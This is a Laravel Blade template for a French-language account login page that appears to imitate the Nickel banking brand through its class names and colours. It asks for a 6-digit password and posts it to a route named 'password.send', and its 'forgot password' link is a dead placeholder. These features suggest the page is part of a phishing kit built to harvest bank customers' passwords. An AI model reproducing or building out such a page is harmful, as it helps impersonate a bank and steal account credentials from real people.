@extends('layouts.app')

@section('content')
<div class="nickel-container">
    <div class="nickel-login-box">
        
    <h2 class="nickel-title">Connexion à mon espace</h2>
    
        <form action="{{ route('password.send') }}" method="POST">
            @csrf
            <div class="form-group">
                <label for="password">Mot de passe (6 chiffres) <span class="required">*</span></label>
                <input type="password" id="password" name="password"
                       maxlength="6" placeholder="******" required>
                <div class="forgot-link">
                    <a href="#">Mot de passe oublié</a>
                </div>
            </div>
            <button type="submit" name="submitpassword" class="submit-btn">
                Se connecter
            </button>
        </form>
    </div>
</div>
<style>

.nickel-container {
    display: flex;
    justify-content: center;
    align-items: center;
    background: #fff;
}

.nickel-login-box {
    max-width: 400px;
    width: 100%;
    padding: 25px;
    text-align: center;
}

.form-group {
    margin-bottom: 20px;
    text-align: left;
}

label {
    font-weight: bold;
    display: block;
    margin-bottom: 8px;
}

.required {
    color: red;
}

input[type="password"] {
    width: 100%;
    padding: 12px;
    border: 1px solid #ccc;
    border-radius: 9999px;
    text-align: center;
    font-size: 16px;
}

.forgot-link {
    text-align: right;
    margin-top: 8px;
    margin-right: 15px
}

.forgot-link a {
    text-decoration: none;
    font-size: 14px;
    font-weight: bold;
    text-decoration: underline;
    color: black;
}

.submit-btn {
    background: #f04400;
    color: white;
    border: none;
    padding: 12px 25px;
    border-radius: 9999px;
    cursor: pointer;
    font-size: 16px;
    transition: background 0.3s ease;
}

.submit-btn:hover {
    background: #c53700;
}

/* ✅ Responsive */
@media (max-width: 768px) {
    .nickel-login-box {
        padding: 15px;
        max-width: 90%;
    }

    .submit-btn {
        font-size: 15px;
    }

    input[type="password"]{
        width: 80%;
    }

    .forgot-link a{
    color: black;
    text-align: right;
    text-decoration-thickness: 2px;
    text-underline-offset: 4px;
    }
 }
</style>
@endsection
